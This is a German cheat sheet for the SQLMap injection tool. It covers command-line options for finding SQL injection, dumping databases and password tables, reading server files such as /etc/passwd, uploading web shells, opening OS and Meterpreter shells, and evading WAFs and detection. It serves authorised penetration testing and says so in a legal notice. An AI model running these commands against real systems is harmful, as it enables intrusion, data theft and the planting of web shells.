# 💉 SQLMap – vollständiger Spickzettel

<!-- language-home-navigation -->
[🏠 Deutsche Startseite](../../README.de.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
   _____ ____    __    __  __           
  / ___// __ \  / /   /  |/  /___ _____ 
  \__ \/ / / / / /   / /|_/ / __ `/ __ \
 ___/ / /_/ / / /___/ /  / / /_/ / /_/ /
/____/\___\_\/_____/_/  /_/\__,_/ .___/ 
                               /_/      
    Werkzeug zur automatisierten Prüfung auf SQL-Injection
```

<p align="center">
  <img src="https://img.shields.io/badge/SQLMap-Injection-red?style=for-the-badge" alt="SQLMap">
  <img src="https://img.shields.io/badge/SQL-Injection-orange?style=for-the-badge" alt="SQL Injection">
  <img src="https://img.shields.io/badge/Python-Tool-blue?style=for-the-badge&logo=python" alt="Python">
  <img src="https://img.shields.io/badge/Penetration-Testing-purple?style=for-the-badge" alt="Penetration Testing">
</p>

<p align="center">
  <b>🔥 Ein leistungsfähiges Werkzeug zur Automatisierung von SQL-Injection-Tests</b>
</p>

---

## 📋 Inhaltsverzeichnis

- [Einführung](#-einführung)
- [Installation](#-installation)
- [Grundsyntax](#-grundsyntax)
- [Zieloptionen](#-zieloptionen)
- [Anfrageoptionen](#-anfrageoptionen)
- [Erkennungsoptionen](#-erkennungsoptionen)
- [Enumeration](#-enumeration)
- [Datenextraktion](#-datenextraktion)
- [Dateioperationen](#-dateioperationen)
- [Zugriff auf das Betriebssystem](#-zugriff-auf-das-betriebssystem)
- [Umgehungstechniken](#-umgehungstechniken)
- [Tamper-Skripte](#häufige-tamper-skripte)
- [Praxisbeispiele](#-praxisbeispiele)
- [Kurzreferenz](#-kurzreferenz)
- [Tipps und bewährte Vorgehensweisen](#-tipps-und-bewährte-vorgehensweisen)
- [Ressourcen](#-ressourcen)

---

## 🎯 Einführung

**SQLMap** ist ein quelloffenes Werkzeug für Penetrationstests, das die Erkennung und Ausnutzung von SQL-Injection-Schwachstellen automatisiert.

### Wichtige Funktionen

| Eigenschaft | Beschreibung |
|---------|-------------|
| **Automatische Erkennung** | Erkennt SQL-Injection-Schwachstellen automatisch |
| **Unterstützte Datenbanken** | MySQL, PostgreSQL, MSSQL, Oracle, SQLite und weitere |
| **Umfassender Zugriff** | Datenbank-Fingerprinting, Datenextraktion und Betriebssystemzugriff |
| **Umgehungstechniken** | WAF-/IPS-Umgehung mit Tamper-Skripten |
| **Mehrere Injection-Arten** | Boolean-, fehler-, UNION- und zeitbasierte Verfahren sowie gestapelte Abfragen |

### Unterstützte Datenbanken

```
✅ MySQL          ✅ PostgreSQL      ✅ Microsoft SQL Server
✅ Oracle         ✅ SQLite          ✅ IBM DB2
✅ SAP MaxDB      ✅ Firebird        ✅ Sybase
✅ HSQLDB         ✅ Informix        ✅ H2
```

### Arten von SQL-Injection

| Art | Code | Beschreibung |
|------|------|-------------|
| Boolean-basierte Blind-Injection | `B` | Wahr-/Falsch-Antworten |
| Fehlerbasiert | `E` | Datenbankfehler in der Antwort |
| UNION-Abfragen | `U` | Injection über UNION SELECT |
| Gestapelte Abfragen | `S` | Mehrere Abfragen (;) |
| Zeitbasierte Blind-Injection | `T` | Verzögerte Antworten |
| Inline-Abfragen | `Q` | Inline-Abfragen (verschachtelte Abfragen) |

---

## 📥 Installation

### Kali Linux (vorinstalliert)
```bash
# SQLMap aktualisieren
sudo apt update && sudo apt install sqlmap
```

### Von GitHub (aktuelle Version)
```bash
# Repository klonen
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev

# SQLMap ausführen
cd sqlmap-dev
python sqlmap.py --version
```

### Mit pip
```bash
pip install sqlmap
```

### Docker
```bash
docker pull paoloo/sqlmap
docker run -it paoloo/sqlmap -u "http://target.com/page?id=1"
```

### Installation prüfen
```bash
sqlmap --version
sqlmap -h          # Grundlegende Hilfe
sqlmap -hh         # Erweiterte Hilfe
```

---

<a name="-grundsyntax"></a>

## ⌨️ Grundsyntax

### Allgemeine Syntax
```bash
sqlmap [options] -u "URL" 
sqlmap [options] -r request.txt
```

### Beispiele für den Einstieg
```bash
# Einfacher Scan
sqlmap -u "http://target.com/page.php?id=1"

# Mit Cookie scannen
sqlmap -u "http://target.com/page.php?id=1" --cookie="PHPSESSID=abc123"

# POST-Anfrage scannen
sqlmap -u "http://target.com/login.php" --data="user=admin&pass=test"

# Aus einer Datei scannen
sqlmap -r request.txt

# Nichtinteraktiver Modus
sqlmap -u "http://target.com/page.php?id=1" --batch
```

---

## 🎯 Zieloptionen

### Ziel-URL (-u)
```bash
# Einfache URL
sqlmap -u "http://target.com/page.php?id=1"

# Mehrere Parameter
sqlmap -u "http://target.com/page.php?id=1&cat=5"

# Zu prüfenden Parameter angeben
sqlmap -u "http://target.com/page.php?id=1&cat=5" -p id

# Alle Parameter prüfen
sqlmap -u "http://target.com/page.php?id=1&cat=5" --level=5
```

### Anfragedatei (-r)
```bash
# Anfrage aus Burp Suite in einer Datei speichern
# Anschließend scannen:
sqlmap -r request.txt

# Beispiel einer Anfragedatei:
# POST /login.php HTTP/1.1
# Host: target.com
# Content-Type: application/x-www-form-urlencoded
# Cookie: session=abc123
#
# username=admin&password=test
```

### Google-Dork (-g)
```bash
# Google-Ergebnisse suchen und prüfen
sqlmap -g "inurl:page.php?id="

# Mit bestimmten Seiten
sqlmap -g "inurl:product.php?id= site:target.com"
```

### Direkte Datenbankverbindung (-d)
```bash
# Direkt mit einer Datenbank verbinden
sqlmap -d "mysql://user:pass@target.com:3306/database"
sqlmap -d "mssql://user:pass@target.com:1433/database"
```

### Mehrere Ziele (-m)
```bash
# Datei mit mehreren URLs
sqlmap -m targets.txt

# targets.txt:
# http://target1.com/page.php?id=1
# http://target2.com/item.php?id=2
# http://target3.com/view.php?id=3
```

### Konfigurationsdatei (-c)
```bash
# Konfigurationsdatei verwenden
sqlmap -c sqlmap.conf
```

---

## 📡 Anfrageoptionen

### HTTP-Methode und Daten
```bash
# POST-Daten
sqlmap -u "http://target.com/login.php" --data="user=admin&pass=test"

# Methode angeben
sqlmap -u "http://target.com/api/user/1" --method=PUT

# JSON-Daten
sqlmap -u "http://target.com/api" --data='{"id":1}' --headers="Content-Type: application/json"
```

### Cookies
```bash
# Einzelner Cookie
sqlmap -u "http://target.com/page.php?id=1" --cookie="PHPSESSID=abc123"

# Mehrere Cookies
sqlmap -u "http://target.com/page.php?id=1" --cookie="session=abc;auth=xyz"

# Cookies aus einer Datei laden
sqlmap -u "http://target.com/page.php?id=1" --load-cookies=cookies.txt

# Cookie-Parameter prüfen
sqlmap -u "http://target.com/page.php" --cookie="id=1*" --level=2
```

### Header
```bash
# Eigener Header
sqlmap -u "http://target.com/page.php?id=1" --headers="X-Forwarded-For: 127.0.0.1"

# Mehrere Header
sqlmap -u "http://target.com/page.php?id=1" --headers="X-Forwarded-For: 127.0.0.1\nAccept-Language: en"

# User-Agent
sqlmap -u "http://target.com/page.php?id=1" --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64)"

# Zufälliger User-Agent
sqlmap -u "http://target.com/page.php?id=1" --random-agent

# Referer
sqlmap -u "http://target.com/page.php?id=1" --referer="http://google.com"
```

### Authentifizierung
```bash
# Basic-Authentifizierung
sqlmap -u "http://target.com/page.php?id=1" --auth-type=Basic --auth-cred="user:pass"

# Digest-Authentifizierung
sqlmap -u "http://target.com/page.php?id=1" --auth-type=Digest --auth-cred="user:pass"

# NTLM-Authentifizierung
sqlmap -u "http://target.com/page.php?id=1" --auth-type=NTLM --auth-cred="domain\\user:pass"
```

### Proxy
```bash
# HTTP-Proxy
sqlmap -u "http://target.com/page.php?id=1" --proxy="http://127.0.0.1:8080"

# SOCKS-Proxy
sqlmap -u "http://target.com/page.php?id=1" --proxy="socks5://127.0.0.1:9050"

# Tor
sqlmap -u "http://target.com/page.php?id=1" --tor --tor-type=SOCKS5

# Tor prüfen
sqlmap -u "http://target.com/page.php?id=1" --tor --check-tor
```

---

## 🔍 Erkennungsoptionen

### Prüfumfang und Risiko
```bash
# Prüfstufe (1-5) – Anzahl der Tests
sqlmap -u "http://target.com/page.php?id=1" --level=3

# Risiko (1-3) – Eingriffsrisiko der Tests
sqlmap -u "http://target.com/page.php?id=1" --risk=2

# Laut Vorlage für gründliche Tests empfohlen
sqlmap -u "http://target.com/page.php?id=1" --level=5 --risk=3
```

| Prüfstufe | Tests |
|-------|-------|
| 1 | Standard – grundlegende Tests |
| 2 | + Cookies prüfen |
| 3 | + User-Agent und Referer prüfen |
| 4 | + Weitere Payloads |
| 5 | + Alle Payloads |

| Risiko | Beschreibung |
|------|-------------|
| 1 | Standard – laut Vorlage sichere Tests |
| 2 | + Aufwendige zeitbasierte Tests |
| 3 | + OR-basierte Tests (können Daten verändern!) |

### Techniken auswählen
```bash
# Bestimmte Technik
sqlmap -u "http://target.com/page.php?id=1" --technique=U    # Nur UNION
sqlmap -u "http://target.com/page.php?id=1" --technique=B    # Nur Boolean-basiert
sqlmap -u "http://target.com/page.php?id=1" --technique=E    # Nur fehlerbasiert
sqlmap -u "http://target.com/page.php?id=1" --technique=T    # Nur zeitbasiert
sqlmap -u "http://target.com/page.php?id=1" --technique=S    # Nur gestapelte Abfragen

# Mehrere Techniken
sqlmap -u "http://target.com/page.php?id=1" --technique=BEU

# Alle Techniken (Standard)
sqlmap -u "http://target.com/page.php?id=1" --technique=BEUSTQ
```

### Zeitliche Verzögerungen
```bash
# Verzögerungszeit für zeitbasierte Injection (Standard: 5)
sqlmap -u "http://target.com/page.php?id=1" --time-sec=10

# Verzögerung zwischen Anfragen
sqlmap -u "http://target.com/page.php?id=1" --delay=2
```

### Threads
```bash
# Gleichzeitige Verbindungen (Standard: 1)
sqlmap -u "http://target.com/page.php?id=1" --threads=10
```

---

## 📊 Enumeration

### Datenbanken erfassen
```bash
# Aktuelle Datenbank ermitteln
sqlmap -u "http://target.com/page.php?id=1" --current-db

# Aktuellen Benutzer ermitteln
sqlmap -u "http://target.com/page.php?id=1" --current-user

# Prüfen, ob der Benutzer Datenbankadministrator ist
sqlmap -u "http://target.com/page.php?id=1" --is-dba

# Alle Datenbanken auflisten
sqlmap -u "http://target.com/page.php?id=1" --dbs

# Alle Benutzer auflisten
sqlmap -u "http://target.com/page.php?id=1" --users

# Benutzerpasswörter auflisten
sqlmap -u "http://target.com/page.php?id=1" --passwords

# Berechtigungen auflisten
sqlmap -u "http://target.com/page.php?id=1" --privileges

# Rollen auflisten
sqlmap -u "http://target.com/page.php?id=1" --roles
```

### Tabellen erfassen
```bash
# Tabellen einer Datenbank auflisten
sqlmap -u "http://target.com/page.php?id=1" -D database_name --tables

# Alle Tabellen auflisten
sqlmap -u "http://target.com/page.php?id=1" --tables

# Tabelleneinträge zählen
sqlmap -u "http://target.com/page.php?id=1" -D database_name --count
```

### Spalten erfassen
```bash
# Spalten einer Tabelle auflisten
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T table_name --columns

# Nach Spaltennamen suchen
sqlmap -u "http://target.com/page.php?id=1" --search -C password
sqlmap -u "http://target.com/page.php?id=1" --search -C email,user
```

### Datenbankschema auslesen
```bash
# Datenbankschema auslesen
sqlmap -u "http://target.com/page.php?id=1" --schema

# Systemdatenbanken ausschließen
sqlmap -u "http://target.com/page.php?id=1" --schema --exclude-sysdbs
```

---

## 📤 Datenextraktion

### Daten auslesen
```bash
# Bestimmte Tabelle auslesen
sqlmap -u "http://target.com/page.php?id=1" -D database -T users --dump

# Bestimmte Spalten auslesen
sqlmap -u "http://target.com/page.php?id=1" -D database -T users -C username,password --dump

# Alle Tabellen einer Datenbank auslesen
sqlmap -u "http://target.com/page.php?id=1" -D database --dump-all

# Alle Daten auslesen
sqlmap -u "http://target.com/page.php?id=1" --dump-all

# Systemdatenbanken ausschließen
sqlmap -u "http://target.com/page.php?id=1" --dump-all --exclude-sysdbs
```

### Ergebnisse begrenzen
```bash
# Erste 10 Zeilen
sqlmap -u "http://target.com/page.php?id=1" -D database -T users --dump --start=1 --stop=10

# Zeilen 5-15
sqlmap -u "http://target.com/page.php?id=1" -D database -T users --dump --start=5 --stop=15

# WHERE-Klausel
sqlmap -u "http://target.com/page.php?id=1" -D database -T users --dump --where="admin=1"
```

### Eigene SQL-Abfragen
```bash
# SQL-Abfrage ausführen
sqlmap -u "http://target.com/page.php?id=1" --sql-query="SELECT version()"

# Interaktive SQL-Shell
sqlmap -u "http://target.com/page.php?id=1" --sql-shell
```

### Ausgabeformate
```bash
# Als CSV speichern
sqlmap -u "http://target.com/page.php?id=1" -D database -T users --dump --csv-del=","

# Als HTML speichern
sqlmap -u "http://target.com/page.php?id=1" -D database -T users --dump --output-dir=/tmp/output
```

---

## 📁 Dateioperationen

### Dateien lesen
```bash
# Datei vom Server lesen
sqlmap -u "http://target.com/page.php?id=1" --file-read="/etc/passwd"

# Windows-Dateien lesen
sqlmap -u "http://target.com/page.php?id=1" --file-read="C:/Windows/System32/drivers/etc/hosts"

# Webkonfiguration lesen
sqlmap -u "http://target.com/page.php?id=1" --file-read="/var/www/html/config.php"
```

### Dateien schreiben
```bash
# Datei auf den Server schreiben
sqlmap -u "http://target.com/page.php?id=1" --file-write="/local/shell.php" --file-dest="/var/www/html/shell.php"

# Webshell hochladen
sqlmap -u "http://target.com/page.php?id=1" --file-write="./webshell.php" --file-dest="/var/www/html/cmd.php"
```

---

## 💻 Zugriff auf das Betriebssystem

### Befehlsausführung
```bash
# Betriebssystembefehl ausführen
sqlmap -u "http://target.com/page.php?id=1" --os-cmd="whoami"

# Interaktive Shell
sqlmap -u "http://target.com/page.php?id=1" --os-shell

# PowerShell unter Windows
sqlmap -u "http://target.com/page.php?id=1" --os-shell --os-cmd="powershell"
```

### Meterpreter-Sitzung
```bash
# Meterpreter-Sitzung erhalten
sqlmap -u "http://target.com/page.php?id=1" --os-pwn

# Mit bestimmten Optionen
sqlmap -u "http://target.com/page.php?id=1" --os-pwn --msf-path=/opt/metasploit
```

### SMB-Relay
```bash
# SMB-Relay-Angriff
sqlmap -u "http://target.com/page.php?id=1" --os-smbrelay
```

### Registry-Zugriff (Windows)
```bash
# Registry lesen
sqlmap -u "http://target.com/page.php?id=1" --reg-read -reg-key="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft"

# Registry-Schlüssel hinzufügen
sqlmap -u "http://target.com/page.php?id=1" --reg-add --reg-key="..." --reg-value="..." --reg-data="..." --reg-type=REG_SZ

# Registry-Schlüssel löschen
sqlmap -u "http://target.com/page.php?id=1" --reg-del --reg-key="..." --reg-value="..."
```

---

<a name="-umgehungstechniken"></a>

## 🛡️ Umgehungstechniken

### WAF-/IPS-Umgehung
```bash
# WAF erkennen
sqlmap -u "http://target.com/page.php?id=1" --identify-waf

# WAF-Erkennung überspringen
sqlmap -u "http://target.com/page.php?id=1" --skip-waf

# Zufällige Groß-/Kleinschreibung
sqlmap -u "http://target.com/page.php?id=1" --tamper=randomcase

# Mehrere Tamper-Skripte
sqlmap -u "http://target.com/page.php?id=1" --tamper=space2comment,randomcase,between
```

### Häufige Tamper-Skripte
```bash
# URL-Kodierung
--tamper=charencode

# Doppelte URL-Kodierung
--tamper=chardoubleencode

# Unicode-Kodierung
--tamper=charunicodeencode

# Leerzeichen durch Kommentare ersetzen
--tamper=space2comment
--tamper=space2hash
--tamper=space2morehash

# Groß-/Kleinschreibung verändern
--tamper=randomcase
--tamper=lowercase
--tamper=uppercase

# Schlüsselwörter ersetzen
--tamper=between
--tamper=equaltolike
```

### Referenz der Tamper-Skripte

| Skript | Beschreibung |
|--------|-------------|
| `apostrophemask` | Apostroph durch ein UTF-8-Zeichen ersetzen |
| `apostrophenullencode` | Apostroph laut Vorlage durch doppeltes Unicode ersetzen |
| `base64encode` | Payload mit Base64 kodieren |
| `between` | Ersetzen von `>` durch `NOT BETWEEN 0 AND #` |
| `charencode` | Alle Zeichen URL-kodieren |
| `charunicodeencode` | Unicode-URL-Kodierung |
| `concat2concatws` | Ersetzen von `CONCAT` durch `CONCAT_WS` |
| `equaltolike` | Ersetzen von `=` durch `LIKE` |
| `greatest` | Ersetzen von `>` durch `GREATEST` |
| `halfversionedmorekeywords` | Versionierten MySQL-Kommentar hinzufügen |
| `ifnull2ifisnull` | Ersetzen von `IFNULL` durch `IF(ISNULL())` |
| `lowercase` | Schlüsselwörter kleinschreiben |
| `modsecurityversioned` | ModSecurity mit einem versionierten Kommentar umgehen |
| `modsecurityzeroversioned` | ModSecurity mit einem Kommentar der Version null umgehen |
| `percentage` | Prozentzeichen vor Zeichen setzen |
| `randomcase` | Groß-/Kleinschreibung von Schlüsselwörtern zufällig ändern |
| `randomcomments` | Zufällige Kommentare in SQL-Schlüsselwörter einfügen |
| `securesphere` | Besondere Zeichenfolge zur SecureSphere-Umgehung anhängen |
| `space2comment` | Leerzeichen ersetzen durch `/**/` |
| `space2dash` | Leerzeichen durch den Kommentar `--` ersetzen |
| `space2hash` | Leerzeichen durch einen `#`-Kommentar ersetzen |
| `space2morehash` | Leerzeichen ersetzen durch `#` und Zeilenumbruch |
| `space2mssqlblank` | Leerzeichen durch MSSQL-Leerraumzeichen ersetzen |
| `space2mssqlhash` | Leerzeichen ersetzen durch `#` und Zeilenumbruch (MSSQL) |
| `space2plus` | Leerzeichen ersetzen durch `+` |
| `space2randomblank` | Leerzeichen durch ein zufälliges Leerraumzeichen ersetzen |
| `symboliclogical` | Ersetzen von `AND`/`OR` durch `&&`/`\|\|` |
| `unionalltounion` | Ersetzen von `UNION ALL` durch `UNION` |
| `unmagicquotes` | Anführungszeichen durch die Multibyte-Folge `%bf%27` ersetzen |
| `uppercase` | Schlüsselwörter großschreiben |
| `versionedkeywords` | Schlüsselwörter in einen versionierten Kommentar einschließen |
| `versionedmorekeywords` | Weitere Schlüsselwörter in einen versionierten Kommentar einschließen |
| `xforwardedfor` | Gefälschten `X-Forwarded-For`-Header hinzufügen |

---

## 🎬 Praxisbeispiele

### Beispiel 1: Einfacher Scan
```bash
# Im nichtinteraktiven Modus scannen
sqlmap -u "http://target.com/products.php?id=1" --batch --banner
```

### Beispiel 2: Datenbank vollständig auslesen
```bash
# Erfassen und auslesen
sqlmap -u "http://target.com/page.php?id=1" \
    --dbs \
    --batch

# Nach dem Ermitteln der Datenbank
sqlmap -u "http://target.com/page.php?id=1" \
    -D shop_db \
    --tables \
    --batch

# Benutzertabelle auslesen
sqlmap -u "http://target.com/page.php?id=1" \
    -D shop_db \
    -T users \
    --dump \
    --batch
```

### Beispiel 3: POST-Anfrage mit Cookie
```bash
sqlmap -u "http://target.com/login.php" \
    --data="username=admin&password=test" \
    --cookie="PHPSESSID=abc123" \
    --level=3 \
    --risk=2 \
    --batch
```

### Beispiel 4: Über den Burp-Proxy
```bash
# Anfrage aus Burp in einer Datei speichern, anschließend:
sqlmap -r request.txt \
    --proxy="http://127.0.0.1:8080" \
    --batch
```

### Beispiel 5: WAF-Umgehung
```bash
sqlmap -u "http://target.com/page.php?id=1" \
    --tamper=space2comment,randomcase,between \
    --random-agent \
    --level=3 \
    --risk=2 \
    --batch
```

### Beispiel 6: Betriebssystem-Shell öffnen
```bash
sqlmap -u "http://target.com/page.php?id=1" \
    --os-shell \
    --batch
```

### Beispiel 7: Vertrauliche Dateien lesen
```bash
sqlmap -u "http://target.com/page.php?id=1" \
    --file-read="/etc/passwd" \
    --batch
```

---

## 📊 Kurzreferenz

### Wichtige Befehle

| Befehl | Beschreibung |
|---------|-------------|
| `-u URL` | Ziel-URL mit Parameter |
| `-r FILE` | Anfrage aus einer Datei laden |
| `--data=DATA` | POST-Daten |
| `--cookie=COOKIE` | HTTP-Cookie |
| `--dbs` | Datenbanken auflisten |
| `--tables` | Tabellen auflisten |
| `--columns` | Spalten auflisten |
| `--dump` | Daten auslesen |
| `-D DB` | Datenbank angeben |
| `-T TABLE` | Tabelle angeben |
| `-C COLS` | Spalten angeben |
| `--batch` | Nichtinteraktiver Modus |

### Erkennungsoptionen

| Option | Beschreibung |
|--------|-------------|
| `--level=LEVEL` | Prüfstufe (1-5) |
| `--risk=RISK` | Risikostufe (1-3) |
| `-p PARAM` | Zu prüfender Parameter |
| `--technique=TECH` | Injection-Technik |
| `--threads=N` | Parallele Threads |

### Ausgabeoptionen

| Option | Beschreibung |
|--------|-------------|
| `-v LEVEL` | Ausführlichkeit (0-6) |
| `--batch` | Keine Eingaben erfragen |
| `--flush-session` | Sitzungs-Cache leeren |
| `--output-dir=DIR` | Eigener Ausgabeordner |

---

## 💡 Tipps und bewährte Vorgehensweisen

### Hinweise zur Leistung

1. **Einfach beginnen**
   ```bash
   # Mit niedriger Prüfstufe beginnen
   sqlmap -u "URL" --level=1 --batch
   # Bei Bedarf erhöhen
   ```

2. **--batch für Automatisierung verwenden**
   ```bash
   sqlmap -u "URL" --batch --dbs
   ```

3. **Mit gezielten Tests Zeit sparen**
   ```bash
   # Nur UNION-basiert prüfen
   sqlmap -u "URL" --technique=U
   ```

### Hinweise zur Vermeidung einer Erkennung

1. **Zufälliger User-Agent**
   ```bash
   sqlmap -u "URL" --random-agent
   ```

2. **Verzögerung einfügen**
   ```bash
   sqlmap -u "URL" --delay=2
   ```

3. **Tor verwenden**
   ```bash
   sqlmap -u "URL" --tor --check-tor
   ```

### Fehlerbehebung

| Problem | Lösung |
|-------|----------|
| Keine Injection gefunden | Erhöhen: `--level` und `--risk` |
| WAF blockiert | Tamper-Skripte mit `--tamper` verwenden |
| Langsamer Scan | Verringern: `--level`, gezielt verwenden: `--technique` |
| Verbindungsprobleme | Prüfen: `--timeout`, `--retries` |

---

## ⚠️ Rechtlicher Hinweis

> **WARNUNG:** SQLMap ist ein leistungsfähiges Werkzeug, das ausschließlich für **autorisierte Tests** eingesetzt werden darf.
> 
> - ✅ Eigene Systeme testen
> - ✅ Mit ausdrücklicher schriftlicher Genehmigung testen
> - ✅ Bei autorisierten Penetrationstests einsetzen
> - ❌ Nie ohne Genehmigung auf Systeme anwenden
> - ❌ Nicht für schädliche Zwecke einsetzen
> 
> **Unbefugter Zugriff auf Computersysteme ist rechtswidrig und kann strafbar sein.**

---

## 📚 Ressourcen

### Offizielle Ressourcen
- [Offizielle SQLMap-Website](https://sqlmap.org/)
- [SQLMap GitHub](https://github.com/sqlmapproject/sqlmap)
- [SQLMap Wiki](https://github.com/sqlmapproject/sqlmap/wiki)

### Lernmaterial
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [PortSwigger SQL Injection](https://portswigger.net/web-security/sql-injection)

### Verwandte Spickzettel
- [Metasploit Framework](../../Metasploit/translations/README.de.md)
- [Meterpreter](../../Metasploit/translations/Meterpreter.de.md)

---

<p align="center">
  <b>💉 SQL-Injection-Tests sicher beherrschen!</b><br>
  <i>Große Macht bringt große Verantwortung mit sich</i>
</p>


---

## Hinweise zur deutschen Ausgabe

> **Prüfumfang und Wirkung:** `--batch` beantwortet Rückfragen mit Standardwerten; es bedeutet weder vollständige Abdeckung noch einen risikofreien Test. `--level` erweitert Tests und Prüfstellen, `--risk` die verwendeten Testarten. Auch die niedrigste Risikostufe ist keine allgemeine Unbedenklichkeitsgarantie. Datenbank- und Betriebssystemzugriff benötigen passende Rechte und DBMS-Funktionen; eine gefundene SQL-Injection garantiert diese Möglichkeiten nicht. [SQLMap: Verwendung](https://github.com/sqlmapproject/sqlmap/wiki/Usage).

> **Korrektur zu Ausgabe und Syntax:** `--output-dir` legt nur den Ausgabeordner fest, nicht das HTML-Format. Dafür ist die Option `--dump-format` maßgeblich; die als „Als HTML speichern“ kommentierte Originalzeile wählt dieses Format nicht aus. In der Registry-Lesezeile steht `-reg-key` mit einem Bindestrich; die dokumentierte Option lautet `--reg-key`. Die Originalbefehle bleiben unverändert. [Ausgabeformate](https://github.com/sqlmapproject/sqlmap/wiki/Usage#format-of-dumped-data), [Optionsparser](https://github.com/sqlmapproject/sqlmap/blob/master/lib/parse/cmdline.py).

> **Versionen und Tamper-Skripte:** `--identify-waf` ist in der geprüften aktuellen Optionsliste nicht enthalten. Tamper-Skripte verändern Darstellungen und Syntax; ihre Wirkung hängt vom DBMS und den beteiligten Filtern ab. Die Tabellenbeschreibungen sind verkürzt. `symboliclogical` erzeugt URL-kodierte symbolische Operatoren; die Tabellenwerte nennen deren logische Zeichen. Tor, wechselnde User-Agents und Verzögerungen garantieren keine fehlende Erkennung. [Optionsparser](https://github.com/sqlmapproject/sqlmap/blob/master/lib/parse/cmdline.py), [symboliclogical-Implementierung](https://github.com/sqlmapproject/sqlmap/blob/master/tamper/symboliclogical.py).

> **Musterwerte und Darstellung:** Der Docker-Image-Name ist eine Referenz der Vorlage, keine offizielle Herkunftszusage. Dateien, Zugangsdaten und Platzhalter werden vorausgesetzt. Die kommentierte HTTP-Anfrage bleibt einschließlich ihrer Feldnamen wörtlich erhalten. Die symbolischen Pipe-Zeichen in einer Tabellenzelle sind ausschließlich für korrektes Markdown maskiert; der dargestellte Wert bleibt gleich. Es wurde kein Beispiel ausgeführt.
